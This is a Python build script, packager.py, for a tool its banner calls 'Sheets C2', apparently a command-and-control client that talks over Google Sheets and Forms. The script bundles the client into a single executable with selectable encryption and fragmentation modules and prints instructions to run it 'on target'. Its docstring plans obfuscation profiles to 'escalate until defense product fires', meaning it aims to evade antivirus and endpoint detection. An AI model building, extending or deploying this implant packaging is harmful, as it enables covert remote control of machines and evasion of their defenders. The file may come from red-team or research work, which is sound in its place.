#!/usr/bin/env python3
"""
packager.py — build a standalone client binary using PyInstaller

Usage:
    python packager.py

Produces a single executable in dist/ for the current OS.
Environment variables must be set at runtime — they are NOT baked into the binary.

Obfuscation profiles (escalate until defense product fires):
    basic    — PyInstaller --onefile (default, implement first)
    upx      — PyInstaller + UPX compression         (planned)
    pyarmor  — PyArmor source encryption + PyInstaller (planned)
    nuitka   — Nuitka native compilation              (planned)
"""

import os
import subprocess
import sys


# ---------------------------------------------------------------------------
# Prompt helpers
# ---------------------------------------------------------------------------

def _ask(prompt, choices, default=None):
    """Ask a multiple-choice question. Returns chosen key."""
    print(f"\n{prompt}")
    keys = list(choices.keys())
    for i, (k, label) in enumerate(choices.items(), 1):
        marker = " (default)" if k == default else ""
        print(f"  [{i}] {label}{marker}")
    while True:
        raw = input("  Choice: ").strip()
        if raw == "" and default:
            return default
        if raw.isdigit() and 1 <= int(raw) <= len(keys):
            return keys[int(raw) - 1]
        print("  Invalid — enter a number from the list.")


def _ask_multi(prompt, choices):
    """Ask a multiple-choice question allowing 'all'. Returns list of keys."""
    print(f"\n{prompt}")
    keys = list(choices.keys())
    for i, (k, label) in enumerate(choices.items(), 1):
        print(f"  [{i}] {label}")
    print(f"  [a] All of the above")
    while True:
        raw = input("  Choice: ").strip().lower()
        if raw == "a":
            return keys
        if raw.isdigit() and 1 <= int(raw) <= len(keys):
            return [keys[int(raw) - 1]]
        print("  Invalid — enter a number or 'a'.")


# ---------------------------------------------------------------------------
# Hidden import sets per module
# ---------------------------------------------------------------------------

CRYPTO_IMPORTS = {
    "plaintext": ["crypto.plaintext"],
    "fernet":    ["crypto.fernet"],
}

FRAGMENTER_IMPORTS = {
    "passthrough": ["fragmenter.passthrough"],
    "fixed":       ["fragmenter.fixed"],
}

# Always included — channel is always Sheets for now
ALWAYS_IMPORTS = [
    "channel.sheets",
    "channel.base",
    "crypto.base",
    "fragmenter.base",
]


# ---------------------------------------------------------------------------
# Build
# ---------------------------------------------------------------------------

def build_basic(hidden_imports, output_name):
    """Run PyInstaller with --onefile and all required hidden imports."""
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--clean",
        "--name", output_name,
        "--distpath", "dist",
        "--workpath", "build",
        "--specpath", "build",
    ]

    for imp in hidden_imports:
        cmd += ["--hidden-import", imp]

    cmd.append("client.py")

    print(f"\n[packager] Running: {' '.join(cmd)}\n")
    result = subprocess.run(cmd)
    return result.returncode == 0


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    print("=" * 52)
    print("  Sheets C2 — Client Packager")
    print("=" * 52)
    print(f"  Platform : {sys.platform}")
    print(f"  Python   : {sys.version.split()[0]}")
    print()
    print("  The binary reads config from environment variables at runtime.")
    print("  No credentials are baked in.")

    # ── Profile ──────────────────────────────────────────────────────────────
    profile = _ask(
        "Obfuscation profile:",
        {
            "basic":   "Basic — PyInstaller --onefile (default)",
            "upx":     "UPX   — PyInstaller + UPX compression (not yet implemented)",
            "pyarmor": "PyArmor — source encryption + PyInstaller (not yet implemented)",
            "nuitka":  "Nuitka — native compilation (not yet implemented)",
        },
        default="basic",
    )

    if profile != "basic":
        print(f"\n[packager] Profile '{profile}' is not yet implemented.")
        print("  See ideas/client_packaging.md for the roadmap.")
        sys.exit(0)

    # ── Crypto modules ────────────────────────────────────────────────────────
    crypto_choices = _ask_multi(
        "Which encryption module(s) to include?",
        {
            "plaintext": "Plaintext — no encryption (debug/demo)",
            "fernet":    "Fernet    — AES + HMAC (recommended for ops)",
        },
    )

    # ── Fragmenter modules ────────────────────────────────────────────────────
    frag_choices = _ask_multi(
        "Which fragmentation module(s) to include?",
        {
            "passthrough": "Passthrough — no fragmentation (default)",
            "fixed":       "Fixed       — fixed-size chunks",
        },
    )

    # ── Output name ───────────────────────────────────────────────────────────
    default_name = "client"
    raw = input(f"\n  Output binary name (default: {default_name}): ").strip()
    output_name = raw if raw else default_name

    # ── Collect hidden imports ────────────────────────────────────────────────
    hidden = list(ALWAYS_IMPORTS)
    for c in crypto_choices:
        hidden += CRYPTO_IMPORTS[c]
    for f in frag_choices:
        hidden += FRAGMENTER_IMPORTS[f]

    print(f"\n[packager] Hidden imports: {hidden}")

    # ── Build ─────────────────────────────────────────────────────────────────
    ok = build_basic(hidden, output_name)

    if ok:
        ext = ".exe" if sys.platform == "win32" else ""
        binary = os.path.join("dist", output_name + ext)
        size_mb = os.path.getsize(binary) / 1024 / 1024
        print(f"\n[packager] Binary: {binary}  ({size_mb:.1f} MB)")
        print(f"[packager] Run on target:")
        print(f"  SPREADSHEET_ID=xxx FORMS_URL=xxx ./{output_name}{ext}")
    else:
        print("\n[packager] Build failed — check PyInstaller output above.")
        sys.exit(1)


if __name__ == "__main__":
    main()
